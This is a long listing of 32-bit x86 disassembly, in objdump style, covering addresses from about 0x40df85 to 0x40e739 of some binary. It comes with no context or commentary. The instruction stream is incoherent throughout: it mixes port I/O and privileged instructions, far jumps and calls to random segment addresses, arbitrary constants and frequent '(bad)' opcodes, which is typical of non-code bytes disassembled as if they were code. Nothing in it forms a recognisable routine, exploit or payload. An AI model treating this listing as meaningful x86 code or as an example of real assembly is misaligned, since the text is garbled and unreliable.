  40df85:	add    BYTE PTR ds:0x1f00f829,al
  40df8b:	cmp    ecx,ebx
  40df8d:	cli    
  40df8e:	push   ss
  40df8f:	js     0x40df29
  40df91:	test   DWORD PTR [ebx],0x34b6fb65
  40df97:	inc    esi
  40df98:	dec    edx
  40df99:	mov    ds:0x45f4acad,eax
  40df9e:	and    BYTE PTR [ebx-0x744f3939],dl
  40dfa4:	jmp    0x4303:0x6d6a3fbe
  40dfab:	mov    edi,0x1e841c27
  40dfb0:	test   BYTE PTR [eax+0x27facac2],cl
  40dfb6:	ret    0xe1ff
  40dfb9:	lds    ecx,FWORD PTR [edx+0x5]
  40dfbc:	cwde   
  40dfbd:	mov    edi,0xced3964b
  40dfc2:	xchg   edi,eax
  40dfc3:	rol    edi,0xb5
  40dfc6:	pushf  
  40dfc7:	inc    eax
  40dfc8:	ret    0x6923
  40dfcb:	test   BYTE PTR [ecx-0x30f05f09],dl
  40dfd1:	popf   
  40dfd2:	shl    BYTE PTR [eax+0x11a214a9],cl
  40dfd8:	xor    esp,DWORD PTR [ecx+0x5694cfb0]
  40dfde:	retf   
  40dfdf:	daa    
  40dfe0:	sub    dh,cl
  40dfe2:	sti    
  40dfe3:	out    0x42,eax
  40dfe5:	test   BYTE PTR ds:0xf900b439,bh
  40dfeb:	mov    BYTE PTR [ebx],dh
  40dfed:	test   DWORD PTR [ebx],ecx
  40dfef:	mov    ecx,esi
  40dff1:	inc    esi
  40dff2:	xor    eax,DWORD PTR [ebp-0x2430488e]
  40dff8:	fnstsw WORD PTR [ebp-0x71]
  40dffb:	inc    esp
  40dffc:	into   
  40dffd:	pop    esi
  40dffe:	jl     0x40e061
  40e000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e001:	(bad)  
  40e002:	aad    0x5d
  40e004:	out    0xca,eax
  40e006:	cmp    edx,0x48
  40e009:	pop    ebx
  40e00a:	js     0x40e07e
  40e00c:	das    
  40e00d:	pop    ebp
  40e00e:	sbb    al,0x5f
  40e010:	fistp  DWORD PTR [edx]
  40e012:	in     al,0x58
  40e014:	cld    
  40e015:	call   0xe449ce10
  40e01a:	push   0xffffffcd
  40e01c:	loope  0x40e075
  40e01e:	popa   
  40e01f:	cdq    
  40e020:	std    
  40e021:	cld    
  40e022:	aas    
  40e023:	(bad)
  40e026:	(bad)  
  40e027:	mov    dh,0xf9
  40e029:	aam    0xaf
  40e02b:	cmp    al,0x2f
  40e02d:	adc    DWORD PTR [edx+ecx*4+0x25e8e8d0],ecx
  40e034:	daa    
  40e035:	dec    ch
  40e037:	les    esi,FWORD PTR [esi+0x7b41bd03]
  40e03d:	fdiv   st,st(2)
  40e03f:	add    cl,BYTE PTR [eax+0x60e386a6]
  40e045:	ins    DWORD PTR es:[edi],dx
  40e046:	cmp    DWORD PTR [esi],0xb
  40e049:	fnstcw WORD PTR [ecx]
  40e04b:	dec    ebp
  40e04d:	xor    DWORD PTR [esi+eax*2-0x44],esp
  40e051:	int3   
  40e052:	lahf   
  40e053:	mov    esi,0x12822bcc
  40e058:	push   edi
  40e059:	jp     0x40e0a8
  40e05b:	mov    WORD PTR [edx-0x1f],ss
  40e05e:	les    ecx,FWORD PTR [esi-0x3a]
  40e061:	ficom  WORD PTR [esi]
  40e063:	or     cl,cl
  40e065:	pop    esp
  40e066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e067:	sub    DWORD PTR [esi+0x26],esp
  40e06a:	clc    
  40e06b:	mov    dl,0x48
  40e06d:	fadd   QWORD PTR [esi]
  40e06f:	push   esp
  40e070:	dec    esp
  40e071:	ins    DWORD PTR es:[edi],dx
  40e072:	mov    bl,0xf
  40e074:	add    BYTE PTR [ebp-0x2ce36312],0xae
  40e07b:	ds jp  0x40e0d7
  40e07e:	and    al,0x57
  40e080:	and    bh,bh
  40e082:	daa    
  40e083:	aam    0x5b
  40e085:	xor    eax,0xb02d18aa
  40e08a:	cld    
  40e08b:	rcr    BYTE PTR [esi+edi*2+0x2d9b9ae7],cl
  40e092:	std    
  40e093:	sub    dh,al
  40e095:	imul   eax,edi,0x75
  40e098:	jmp    0x3ca4:0xa0f8cdb4
  40e09f:	sub    eax,0x4e9c751f
  40e0a4:	inc    dx
  40e0a6:	jo     0x40e0c0
  40e0a8:	pop    ecx
  40e0a9:	jmp    0x1fa2:0xa168acfe
  40e0b0:	xor    al,0x1a
  40e0b2:	and    bl,dh
  40e0b4:	shl    DWORD PTR [ebx+0x5e],0x77
  40e0b8:	in     al,0x7c
  40e0ba:	xor    esi,DWORD PTR [esi]
  40e0bc:	jge    0x40e0cc
  40e0be:	or     eax,0xe987d444
  40e0c3:	int    0xb8
  40e0c5:	arpl   WORD PTR [edi+0x14204e93],bp
  40e0cb:	inc    esp
  40e0cc:	mov    ebx,0x19d139a4
  40e0d1:	cdq    
  40e0d2:	cld    
  40e0d3:	push   edx
  40e0d4:	mov    al,0x73
  40e0d6:	add    BYTE PTR [esi+ebp*2-0x50c141e3],ah
  40e0dd:	wbinvd 
  40e0df:	cmc    
  40e0e0:	in     al,dx
  40e0e1:	adc    WORD PTR [ebp-0x71b23b6e],0x3e
  40e0e9:	fdivr  st,st(2)
  40e0eb:	or     ebp,eax
  40e0ed:	call   0xd55136a4
  40e0f2:	call   0x4cd0:0x2586ac1c
  40e0f9:	imul   edx,DWORD PTR [ebx-0x37d3ed6a],0xffffffff
  40e100:	push   edi
  40e101:	aam    0x20
  40e103:	inc    esi
  40e104:	fisttp DWORD PTR [esi-0x4e83bd32]
  40e10a:	sub    DWORD PTR [edx-0x38d9c60e],eax
  40e110:	cwde   
  40e111:	xor    DWORD PTR ss:[edx+0x213beef1],eax
  40e118:	dec    ebp
  40e119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e11a:	jg     0x40e0fe
  40e11c:	(bad)  
  40e11d:	push   cs
  40e11e:	xchg   esp,eax
  40e11f:	inc    ecx
  40e120:	ins    DWORD PTR es:[edi],dx
  40e121:	leave  
  40e122:	pop    ds
  40e123:	loop   0x40e0e2
  40e125:	add    esi,DWORD PTR [ecx-0x20]
  40e128:	mov    cl,0x1c
  40e12a:	test   esi,ebp
  40e12c:	cld    
  40e12d:	pop    esp
  40e12e:	in     eax,dx
  40e12f:	lods   al,BYTE PTR ds:[esi]
  40e130:	add    bl,BYTE PTR [edx]
  40e132:	xchg   edx,ecx
  40e134:	push   0x7b
  40e136:	std    
  40e137:	jecxz  0x40e118
  40e139:	into   
  40e13a:	daa    
  40e13b:	int    0xba
  40e13d:	inc    ebx
  40e13e:	imul   ebx,DWORD PTR [edx+0x1d],0x141566cc
  40e145:	(bad)  
  40e146:	mov    ebx,0x6ba7fba0
  40e14b:	jmp    0x2dbf9c96
  40e150:	in     al,dx
  40e151:	daa    
  40e152:	mov    DWORD PTR [ebx],ecx
  40e154:	add    bh,BYTE PTR fs:[ecx+0x54072bd]
  40e15b:	sub    ebp,0xffffffd7
  40e15e:	imul   ebx,DWORD PTR [edi+0x45],0x311833f
  40e165:	and    eax,0x3418588e
  40e16a:	push   eax
  40e16b:	mov    cs,WORD PTR [ecx+0x68830e18]
  40e171:	mov    eax,ds:0x5387672b
  40e176:	mov    esi,0x96ddbc5e
  40e17b:	(bad)  
  40e17c:	popf   
  40e17d:	sar    BYTE PTR [ebp+eiz*2-0x904dcbe],cl
  40e184:	adc    eax,0x234aef27
  40e189:	sbb    ebp,DWORD PTR [ebx+0x46bb6e69]
  40e18f:	xchg   edi,eax
  40e190:	ins    BYTE PTR es:[edi],dx
  40e191:	inc    edi
  40e192:	push   ds
  40e193:	inc    BYTE PTR es:[edx+0x31]
  40e197:	aaa    
  40e198:	add    bh,dl
  40e19a:	sbb    cl,BYTE PTR [ecx]
  40e19c:	xor    eax,0x44c7fe27
  40e1a1:	xchg   ecx,eax
  40e1a2:	loopne 0x40e132
  40e1a4:	out    0x51,eax
  40e1a6:	pusha  
  40e1a7:	into   
  40e1a8:	push   ebx
  40e1a9:	aaa    
  40e1aa:	and    ecx,esp
  40e1ac:	xor    DWORD PTR [edi+edi*4],edi
  40e1af:	test   al,0xb5
  40e1b1:	repz mov bl,0xe5
  40e1b4:	daa    
  40e1b5:	mov    esp,ebp
  40e1b7:	dec    edx
  40e1b8:	xor    DWORD PTR [eax+edx*4+0x75],ebx
  40e1bc:	ret    0xc0aa
  40e1bf:	retf   
  40e1c0:	outs   dx,BYTE PTR ds:[esi]
  40e1c1:	jae    0x40e174
  40e1c3:	xchg   al,ch
  40e1c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c6:	xchg   ebp,eax
  40e1c7:	sbb    bh,BYTE PTR [edi]
  40e1c9:	add    dl,cl
  40e1cb:	push   0xffffffd0
  40e1cd:	rcl    DWORD PTR [ebp+0x5f],0x43
  40e1d1:	ds into 
  40e1d3:	(bad)  
  40e1d4:	scas   eax,DWORD PTR es:[edi]
  40e1d5:	retf   0x5063
  40e1d8:	push   esp
  40e1d9:	sbb    bh,BYTE PTR [esi-0x7b0dcafd]
  40e1df:	iret   
  40e1e0:	pop    edx
  40e1e1:	pop    ebx
  40e1e2:	and    esp,ebx
  40e1e4:	or     eax,0xd0bf0030
  40e1e9:	ds push ebp
  40e1eb:	add    al,0x3e
  40e1ed:	(bad)  
  40e1ee:	cwde   
  40e1ef:	xor    esp,edx
  40e1f1:	cli    
  40e1f2:	jbe    0x40e19f
  40e1f4:	xchg   esi,eax
  40e1f5:	shl    ah,cl
  40e1f7:	push   ebp
  40e1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f9:	push   DWORD PTR [edx-0x4fc34187]
  40e1ff:	add    dh,BYTE PTR [ebx]
  40e201:	cmp    eax,0x9ba61601
  40e206:	popa   
  40e207:	or     eax,0xccf20ff6
  40e20c:	jns    0x40e1ef
  40e20e:	xor    edi,ebp
  40e210:	shr    DWORD PTR [ebx+0x46],1
  40e213:	jnp    0x40e23c
  40e215:	call   0xa10a7280
  40e21a:	xchg   DWORD PTR [edx],edi
  40e21c:	mov    eax,0x35e582e6
  40e221:	adc    ebp,esi
  40e223:	pop    ebx
  40e224:	in     eax,dx
  40e225:	pop    gs
  40e227:	(bad)
  40e22a:	xchg   BYTE PTR [ecx+0x174b6030],bh
  40e230:	mov    dl,0x58
  40e232:	adc    bl,cl
  40e234:	cmp    DWORD PTR [esi],ebp
  40e236:	in     eax,dx
  40e237:	mov    al,al
  40e239:	xchg   ebx,eax
  40e23a:	repz jbe 0x40e1e6
  40e23d:	add    bl,BYTE PTR ds:0x521c1297
  40e243:	sub    al,BYTE PTR [esi]
  40e245:	out    dx,al
  40e246:	push   eax
  40e247:	es pushf 
  40e249:	into   
  40e24a:	fmul   DWORD PTR ds:0x5b5b
  40e24f:	jg     0x40e20d
  40e251:	ret    0x8cae
  40e254:	or     edx,DWORD PTR [edi-0x69]
  40e257:	add    ecx,ecx
  40e259:	pop    es
  40e25a:	jl     0x40e2a3
  40e25c:	ret    
  40e25d:	jmp    0x534a:0x5f845261
  40e264:	outs   dx,BYTE PTR ds:[esi]
  40e265:	call   0x4424:0x55814fae
  40e26c:	jno    0x40e28e
  40e26e:	(bad)  
  40e26f:	push   ebx
  40e270:	mov    bl,0xf0
  40e272:	jmp    0x7bbfd1ca
  40e277:	fsubr  DWORD PTR [edi-0x35]
  40e27a:	and    eax,0x3190babd
  40e27f:	out    0x8b,al
  40e281:	sub    ecx,DWORD PTR [edx+0x7c]
  40e284:	loopne 0x40e22c
  40e286:	fld    QWORD PTR [esi+0x2b730fb9]
  40e28c:	or     al,0x58
  40e28e:	ins    DWORD PTR es:[edi],dx
  40e28f:	lds    ebx,FWORD PTR gs:[esi]
  40e292:	test   DWORD PTR [eax+edx*2],0xcfbace09
  40e299:	pushf  
  40e29a:	int3   
  40e29b:	adc    BYTE PTR [edx-0x1c],cl
  40e29e:	lods   eax,DWORD PTR ds:[esi]
  40e29f:	(bad)  
  40e2a0:	jmp    0xeea1965f
  40e2a5:	cmp    al,BYTE PTR [ecx-0x1a6d2319]
  40e2ab:	xchg   esi,eax
  40e2ac:	push   ebp
  40e2ad:	xor    DWORD PTR es:[eax-0x41],0x6b
  40e2b2:	and    al,bl
  40e2b4:	mov    dh,0xc0
  40e2b6:	push   ss
  40e2b7:	(bad)  
  40e2b8:	aad    0x74
  40e2ba:	cdq    
  40e2bb:	ds call 0x22c6:0xdc9e6a07
  40e2c3:	mov    ds:0xde58daf2,eax
  40e2c8:	push   esi
  40e2c9:	and    al,0x5
  40e2cb:	sbb    al,0xad
  40e2cd:	pop    esp
  40e2ce:	loopne 0x40e2be
  40e2d0:	pop    ecx
  40e2d1:	jno    0x40e335
  40e2d3:	retf   0xf66a
  40e2d6:	int3   
  40e2d7:	add    al,0x49
  40e2d9:	or     BYTE PTR [ecx+0x6b],0x2c
  40e2dd:	int    0x69
  40e2df:	std    
  40e2e0:	cli    
  40e2e1:	or     esi,DWORD PTR [eax]
  40e2e3:	fild   DWORD PTR [eax+0x5e]
  40e2e6:	rol    BYTE PTR [esi],cl
  40e2e8:	mov    ch,0x31
  40e2ea:	ror    DWORD PTR [ebp-0x54],1
  40e2ed:	push   esi
  40e2ee:	sbb    al,0xc9
  40e2f0:	mov    ebx,0xdf17f744
  40e2f5:	xor    DWORD PTR [eax+0x6b4d9505],edi
  40e2fb:	ins    BYTE PTR es:[edi],dx
  40e2fc:	adc    eax,0x5681036f
  40e301:	dec    esi
  40e302:	mov    bl,0xff
  40e304:	test   al,0x24
  40e306:	fcom   DWORD PTR [edx+ecx*8]
  40e309:	sub    al,0xf6
  40e30b:	xor    BYTE PTR [ecx-0xd],ah
  40e30e:	mov    BYTE PTR [edx],0xd1
  40e311:	xor    al,0x23
  40e313:	pop    ecx
  40e314:	stos   DWORD PTR es:[edi],eax
  40e315:	inc    ebp
  40e316:	loopne 0x40e2f0
  40e318:	cmp    BYTE PTR [ecx],dh
  40e31a:	cmp    BYTE PTR [ebx-0x34043eff],dh
  40e320:	inc    eax
  40e321:	xchg   edx,eax
  40e322:	(bad)
  40e326:	repnz std 
  40e328:	or     al,0x30
  40e32a:	in     al,dx
  40e32b:	pop    ebx
  40e32c:	mov    esi,0x1e64c85d
  40e331:	retf   
  40e332:	cli    
  40e333:	in     eax,dx
  40e334:	add    al,0x6b
  40e336:	ss pop edi
  40e338:	jmp    0xd41d:0xc1ed85ea
  40e33f:	sub    eax,0x41f50e8b
  40e344:	loope  0x40e322
  40e346:	xor    DWORD PTR [edx+0x2c],edi
  40e349:	pop    ecx
  40e34a:	jmp    0x7bfd:0xd8a847da
  40e351:	sub    eax,0x9d4aa0cf
  40e356:	pop    edx
  40e357:	pop    eax
  40e358:	sub    al,0x21
  40e35a:	inc    edi
  40e35b:	jbe    0x40e351
  40e35d:	dec    esp
  40e35e:	or     al,0xc2
  40e360:	pushf  
  40e361:	lds    eax,FWORD PTR [esi+0x53265871]
  40e367:	clc    
  40e368:	sub    edi,edx
  40e36a:	outs   dx,DWORD PTR ss:[esi]
  40e36c:	fist   WORD PTR [ebp+0x7a1cc572]
  40e372:	gs jge 0x40e386
  40e375:	retf   
  40e376:	push   es
  40e377:	add    ebx,DWORD PTR [edx+0x5683369a]
  40e37d:	push   ds
  40e37e:	inc    ecx
  40e37f:	cmp    cl,BYTE PTR [edx-0x6cd61aaa]
  40e385:	ret    
  40e386:	std    
  40e387:	enter  0xb015,0xbb
  40e38b:	jecxz  0x40e3c2
  40e38d:	push   ss
  40e38e:	popa   
  40e38f:	and    al,BYTE PTR [edx-0x715b3b10]
  40e395:	jl     0x40e37b
  40e397:	lods   al,BYTE PTR ds:[esi]
  40e398:	sbb    esi,eax
  40e39a:	aam    0x9e
  40e39c:	cmc    
  40e39d:	test   edx,eax
  40e39f:	mov    eax,0x174f13e6
  40e3a4:	sub    al,0x45
  40e3a6:	xchg   BYTE PTR [edi-0x2c],ah
  40e3a9:	pop    ss
  40e3aa:	jmp    0xa0762aa9
  40e3af:	dec    eax
  40e3b0:	sbb    DWORD PTR [edx+0x27811f61],ebp
  40e3b6:	loopne 0x40e34c
  40e3b8:	mov    esp,0x56f5b5db
  40e3bd:	iret   
  40e3be:	jb     0x40e3b5
  40e3c0:	adc    eax,0x3eac82c
  40e3c5:	out    dx,eax
  40e3c6:	popf   
  40e3c7:	pop    esp
  40e3c8:	test   BYTE PTR [esi+0x5d],0xa4
  40e3cc:	jno    0x40e399
  40e3ce:	jmp    0x40e362
  40e3d0:	pop    edi
  40e3d1:	mov    ch,0x7b
  40e3d3:	test   DWORD PTR [esi+0x28],eax
  40e3d6:	imul   ecx,DWORD PTR [edx-0x7dfeac2f],0x5b0fcba6
  40e3e0:	loop   0x40e3fb
  40e3e2:	pop    ds
  40e3e3:	arpl   WORD PTR [ebx+0x67],cx
  40e3e6:	inc    eax
  40e3e7:	mov    es,WORD PTR [ebp-0x297f7e5b]
  40e3ed:	inc    esi
  40e3ee:	cmp    ebx,DWORD PTR [esi-0x75289cc3]
  40e3f4:	xor    BYTE PTR [edi],al
  40e3f6:	(bad)  
  40e3f7:	jmp    0x8ada:0x3e169382
  40e3fe:	mov    edx,0x6af7e5e7
  40e403:	sub    eax,0xa2bc9627
  40e408:	loopne 0x40e3f3
  40e40a:	or     al,0x51
  40e40c:	or     edx,edi
  40e40e:	xor    al,0xd1
  40e410:	loope  0x40e3d1
  40e412:	mov    ebp,0xb55b9e2b
  40e417:	inc    esp
  40e418:	fisubr WORD PTR [ebp+ebx*2-0x55515815]
  40e41f:	jp     0x40e49d
  40e421:	or     al,0x7d
  40e423:	enter  0xf46d,0xe1
  40e427:	ret    
  40e428:	adc    BYTE PTR [eax],bh
  40e42a:	(bad)  [ebp+0x19a7367]
  40e430:	xor    al,0x69
  40e432:	retf   0x2b48
  40e435:	push   ebx
  40e436:	sahf   
  40e437:	xchg   esp,eax
  40e438:	pushf  
  40e439:	fcom   st(1)
  40e43b:	sbb    eax,0xa6075ecc
  40e440:	jp     0x40e454
  40e442:	push   es
  40e443:	inc    esi
  40e444:	jp     0x40e497
  40e446:	inc    esp
  40e447:	stos   BYTE PTR es:[edi],al
  40e448:	sub    BYTE PTR [ecx+edi*8+0x75c80b86],al
  40e44f:	jne    0x40e4b6
  40e451:	xor    DWORD PTR ds:0xb03652cd,ebx
  40e457:	jo     0x40e4cf
  40e459:	jne    0x40e445
  40e45b:	xor    BYTE PTR [eax],0x1a
  40e45e:	xor    al,0x38
  40e460:	sub    DWORD PTR [ecx+0x4d],edi
  40e463:	fwait
  40e464:	xchg   esi,eax
  40e465:	cmp    eax,0xf8d4e37c
  40e46a:	mov    ebx,0x6dca0847
  40e46f:	loop   0x40e4d0
  40e471:	push   es
  40e472:	bound  esi,QWORD PTR [edi-0x244fab1]
  40e478:	sub    ah,dh
  40e47a:	cli    
  40e47b:	dec    ecx
  40e47c:	pop    esi
  40e47d:	call   0x457b:0xc8588d54
  40e484:	jl     0x40e41b
  40e486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e487:	pop    ebx
  40e488:	and    DWORD PTR [bp+si+0x4d],ebp
  40e48c:	shr    edx,1
  40e48e:	sbb    dl,bl
  40e490:	sar    dh,1
  40e492:	or     ebx,0xffffffb7
  40e495:	mov    al,0x1
  40e497:	pop    ds
  40e498:	sbb    BYTE PTR [ebp+0x31c873d5],dh
  40e49e:	lods   eax,DWORD PTR ds:[esi]
  40e49f:	mov    BYTE PTR [eax-0x3e],bl
  40e4a2:	int    0xc2
  40e4a4:	dec    edx
  40e4a5:	out    0xba,eax
  40e4a7:	pop    edi
  40e4a8:	inc    edi
  40e4a9:	(bad)  
  40e4aa:	push   edx
  40e4ab:	nop
  40e4ac:	jecxz  0x40e4e0
  40e4ae:	and    BYTE PTR [esi+0x20],ch
  40e4b1:	sbb    DWORD PTR ds:0x73181bb2,edx
  40e4b7:	or     DWORD PTR [bp+di+0x64],edx
  40e4bb:	call   esi
  40e4bd:	jno    0x40e446
  40e4bf:	retf   
  40e4c0:	das    
  40e4c1:	push   ss
  40e4c2:	cmp    edi,0x2a446442
  40e4c8:	mov    dl,0x3c
  40e4ca:	arpl   WORD PTR [edx],sp
  40e4cc:	xor    dl,dl
  40e4ce:	mov    dh,0x59
  40e4d0:	sahf   
  40e4d1:	call   0x78bd:0x628350a1
  40e4d8:	nop
  40e4d9:	out    dx,eax
  40e4da:	scas   eax,DWORD PTR es:[edi]
  40e4db:	call   0x9531:0x23d76426
  40e4e2:	mov    BYTE PTR [edx],ah
  40e4e4:	push   cs
  40e4e5:	leave  
  40e4e6:	xchg   ebp,eax
  40e4e7:	cld    
  40e4e8:	pop    ebx
  40e4e9:	fs push edi
  40e4ec:	jl     0x40e527
  40e4ee:	sbb    BYTE PTR [ebp+0x3704fccb],0x4f
  40e4f5:	aam    0x90
  40e4f7:	rcr    BYTE PTR [ebx],0xc4
  40e4fa:	rol    bh,cl
  40e4fc:	mov    bl,0x42
  40e4fe:	mov    edi,0x881ca7c
  40e503:	rcl    esp,cl
  40e505:	(bad)  
  40e506:	shr    DWORD PTR [edx+0x17],cl
  40e509:	js     0x40e4d5
  40e50b:	call   0x2f1f:0x2f931d6f
  40e512:	test   DWORD PTR [edi+eax*8-0x5ca61acb],edx
  40e519:	xlat   BYTE PTR ds:[ebx]
  40e51a:	call   0xef10:0x8e9ca3f6
  40e521:	pop    edi
  40e522:	scas   eax,DWORD PTR es:[edi]
  40e523:	sub    esi,DWORD PTR [ecx]
  40e525:	pushf  
  40e526:	rcr    BYTE PTR [ebx+0x4eb00410],0xbf
  40e52d:	inc    esi
  40e52e:	inc    esi
  40e52f:	push   esp
  40e530:	jno    0x40e4ca
  40e532:	jecxz  0x40e4ff
  40e534:	pushf  
  40e535:	stos   DWORD PTR es:[edi],eax
  40e536:	rep outs dx,DWORD PTR ds:[esi]
  40e538:	iret   
  40e539:	(bad)  
  40e53a:	mov    eax,ds:0xe07c318f
  40e53f:	pop    edi
  40e540:	test   dl,dl
  40e542:	sar    esp,0x13
  40e545:	into   
  40e546:	push   esi
  40e547:	icebp  
  40e548:	fwait
  40e549:	pop    ds
  40e54a:	dec    edx
  40e54b:	clc    
  40e54c:	dec    eax
  40e54d:	add    edi,0xdc4c8445
  40e553:	mov    WORD PTR [ebx],cs
  40e555:	xlat   BYTE PTR ds:[ebx]
  40e556:	cmp    BYTE PTR [edx-0x5d4b2a0c],0x6d
  40e55d:	test   DWORD PTR [edx-0x5b],ebx
  40e560:	xchg   ebp,eax
  40e561:	fld    TBYTE PTR [edi]
  40e563:	inc    eax
  40e564:	inc    eax
  40e565:	or     edi,DWORD PTR [esi+ecx*2-0x62c5fa01]
  40e56c:	pop    ss
  40e56d:	mov    cl,0x3c
  40e56f:	(bad)  
  40e570:	neg    DWORD PTR [esi-0x60]
  40e573:	or     edi,ebp
  40e575:	shl    DWORD PTR [ecx-0x3],cl
  40e578:	mov    edi,0xccc95ee4
  40e57d:	jmp    0x40e5d9
  40e57f:	call   0x77c:0xf7989e02
  40e586:	xor    bl,bh
  40e588:	fmul   DWORD PTR [ebx+edx*1+0x5eca47e6]
  40e58f:	xchg   edx,eax
  40e590:	jo     0x40e58d
  40e592:	sub    eax,0x5b5c1daa
  40e597:	pushf  
  40e598:	ret    
  40e599:	out    0x12,eax
  40e59b:	stc    
  40e59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e59d:	fild   WORD PTR [eax-0x26ee3d06]
  40e5a3:	(bad)  
  40e5a5:	jmp    0x40e5d0
  40e5a7:	aad    0xd9
  40e5a9:	adc    al,0xae
  40e5ab:	lahf   
  40e5ac:	adc    eax,0x2ad59581
  40e5b1:	mov    edi,0x5daa93af
  40e5b6:	es cmp eax,0x95e69133
  40e5bc:	dec    eax
  40e5bd:	lods   al,BYTE PTR ds:[esi]
  40e5be:	sub    bl,ah
  40e5c0:	inc    edi
  40e5c1:	je     0x40e5bd
  40e5c3:	pop    DWORD PTR [ecx]
  40e5c5:	les    ebp,FWORD PTR [esi]
  40e5c7:	int    0x7c
  40e5c9:	mov    esi,0xb43405aa
  40e5ce:	fmul   st(7),st
  40e5d0:	mov    esi,0xff372774
  40e5d5:	push   0x8cdeed9a
  40e5da:	xchg   ebx,eax
  40e5db:	dec    ebp
  40e5dc:	dec    DWORD PTR [ecx+0x16]
  40e5df:	push   eax
  40e5e0:	cmp    BYTE PTR [ebp-0x760cff70],0x62
  40e5e7:	jp     0x40e64f
  40e5e9:	pop    esi
  40e5ea:	push   ebp
  40e5eb:	xchg   esp,eax
  40e5ec:	push   edx
  40e5ed:	int    0xd0
  40e5ef:	mov    al,BYTE PTR [ecx-0xb]
  40e5f2:	add    dh,BYTE PTR [eax]
  40e5f4:	clc    
  40e5f5:	xchg   esi,eax
  40e5f6:	pop    ebx
  40e5f7:	in     al,0xa1
  40e5f9:	dec    edx
  40e5fa:	(bad)
  40e5fd:	pop    es
  40e5fe:	mov    bl,0xee
  40e600:	popa   
  40e601:	ja     0x40e5b9
  40e603:	xor    dl,BYTE PTR [esi+0x76]
  40e606:	jmp    0x64ea55f9
  40e60b:	push   0x808aaba2
  40e610:	push   esi
  40e611:	retf   
  40e612:	aas    
  40e613:	pop    ds
  40e614:	cmp    eax,DWORD PTR [edx-0x7842d6fb]
  40e61a:	repz cmp eax,0xaf530e2d
  40e620:	cmp    edx,DWORD PTR [edx+0x5c842bbc]
  40e626:	(bad)  
  40e627:	mov    al,0xa4
  40e629:	scas   al,BYTE PTR es:[edi]
  40e62a:	enter  0xdf74,0x3d
  40e62e:	nop
  40e62f:	add    DWORD PTR [ebx+0x57],edx
  40e632:	cmp    ebx,DWORD PTR [eax+0x4c]
  40e635:	xor    eax,0xe5d2dc37
  40e63a:	fisub  WORD PTR [edi-0x2a6c1504]
  40e640:	stc    
  40e641:	stc    
  40e642:	pop    esp
  40e643:	inc    ebx
  40e644:	jmp    0x40e64c
  40e646:	ds push ss
  40e648:	pop    ss
  40e649:	ror    BYTE PTR [ebp-0xd3d174],0xc
  40e650:	outs   dx,DWORD PTR ds:[esi]
  40e651:	jecxz  0x40e63e
  40e653:	mov    WORD PTR [edi+0x48faa3ed],gs
  40e659:	test   BYTE PTR [ebp-0x2d],bh
  40e65c:	sbb    DWORD PTR [esp+0x2eac1f14],esp
  40e663:	fs push 0x15
  40e666:	ins    DWORD PTR es:[edi],dx
  40e667:	add    al,0xf4
  40e669:	jle    0x40e5ec
  40e66b:	mov    dl,0x3a
  40e66d:	xchg   esp,eax
  40e66e:	or     ah,al
  40e670:	data16 xchg BYTE PTR [edx-0x41],cl
  40e674:	pop    ds
  40e675:	stos   BYTE PTR es:[edi],al
  40e676:	fwait
  40e677:	sbb    eax,0xbf53b7bb
  40e67c:	pop    ss
  40e67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e67e:	mov    bl,0x1d
  40e680:	sub    DWORD PTR [edi],edx
  40e682:	sub    dl,BYTE PTR [edx-0x3b]
  40e685:	sub    ebp,DWORD PTR [edi-0x4b]
  40e688:	dec    ebp
  40e689:	and    al,0x85
  40e68b:	adc    ch,BYTE PTR [edi]
  40e68d:	push   0xffffff90
  40e68f:	xchg   esi,eax
  40e690:	and    eax,DWORD PTR [ecx]
  40e692:	int    0xa9
  40e694:	mul    ch
  40e696:	in     al,0xc6
  40e698:	pop    ecx
  40e699:	adc    DWORD PTR [eax+0x3e96eb57],0x1252a645
  40e6a3:	js     0x40e6ad
  40e6a5:	imul   edi,eax,0xdaa982d3
  40e6ab:	mov    ch,BYTE PTR [esp+edx*4]
  40e6ae:	cs cld 
  40e6b0:	repz repz lock stc 
  40e6b4:	int3   
  40e6b5:	push   0xe601ec8f
  40e6ba:	adc    al,0x24
  40e6bc:	mov    cl,0x43
  40e6be:	int    0xef
  40e6c0:	cmp    eax,0x5ba84959
  40e6c5:	fnsave ds:[ebp-0x67]
  40e6c9:	in     al,0x53
  40e6cb:	loop   0x40e742
  40e6cd:	ret    0x9a60
  40e6d0:	data16 arpl WORD PTR [edx],si
  40e6d3:	stos   BYTE PTR es:[edi],al
  40e6d4:	mov    cl,0xb8
  40e6d6:	(bad)  [ebx-0x2a]
  40e6d9:	mov    ds,WORD PTR [edi]
  40e6db:	pop    ecx
  40e6dc:	cwde   
  40e6dd:	jo     0x40e754
  40e6df:	adc    BYTE PTR [edi-0x4ba3e81f],cl
  40e6e5:	pop    ds
  40e6e6:	imul   ebp,ebx,0xffffff85
  40e6e9:	leave  
  40e6ea:	sub    ch,dl
  40e6ec:	scas   eax,DWORD PTR es:[edi]
  40e6ed:	sub    al,0x5
  40e6ef:	ror    DWORD PTR [eax],0xe5
  40e6f2:	ret    
  40e6f3:	mov    esp,DWORD PTR [ecx-0x2e]
  40e6f6:	(bad)  
  40e6f7:	mov    edi,0x1f18ba02
  40e6fc:	or     dl,BYTE PTR ss:[ecx+0x68]
  40e700:	mov    dh,dh
  40e702:	cli    
  40e703:	mov    ah,0x9a
  40e705:	add    bh,BYTE PTR [edi-0x765aefa9]
  40e70b:	stc    
  40e70c:	sub    al,BYTE PTR [edx+0x392aabba]
  40e712:	mov    bh,0xc1
  40e714:	std    
  40e715:	pusha  
  40e716:	jmp    0xad8a:0x9773d937
  40e71d:	mov    ds:0x173bcf9,al
  40e722:	mov    edx,0x4269b2c7
  40e727:	xchg   ecx,eax
  40e728:	pop    esi
  40e729:	retf   
  40e72a:	test   cl,al
  40e72c:	scas   eax,DWORD PTR es:[edi]
  40e72d:	push   cs
  40e72e:	imul   ebp,DWORD PTR [ecx],0x11
  40e731:	lods   al,BYTE PTR ds:[esi]
  40e732:	dec    ebx
  40e733:	test   BYTE PTR [ebp+0x2dd2aa8f],bl
  40e739:	loope  0x40e6e7
